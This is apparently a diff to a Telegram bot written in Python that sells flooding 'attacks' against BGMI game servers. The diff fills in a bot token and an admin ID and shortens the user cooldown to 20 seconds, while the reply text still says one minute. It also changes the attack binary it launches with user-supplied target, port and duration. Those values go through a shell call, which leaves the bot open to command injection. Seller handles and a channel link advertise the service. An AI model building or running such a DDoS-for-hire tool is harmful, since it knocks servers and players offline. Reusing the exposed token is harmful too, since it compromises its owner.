@@ -7,10 +7,10 @@ import datetime
 import os
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('TOKEN')
+bot = telebot.TeleBot('7092421248:AAH7o6xQAQZMjsmpkWD1m6sC1_D_WnDRIc0')
 
 # Admin user IDs
-admin_id = ["ID"]
+admin_id = ["6552242136"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -223,7 +223,7 @@ def handle_bgmi(message):
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 60:
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 20:
                 response = "You Are On Cooldown ❌. Please Wait 1min Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
@@ -241,7 +241,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 200"
+                full_command = f"./cb {target} {port} {time} "
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
@@ -285,7 +285,7 @@ def show_help(message):
 🤖 To See Admin Commands:
 💥 /admincmd : Shows All Admin Commands.
 
-Buy From :-  @AEGON_THE_OWNER
+Buy From :-  @AGEON_OWNER
 Official Channel :- https://t.me/+nD2UGU3ANqs5ZWM1
 '''
     for handler in bot.message_handlers:
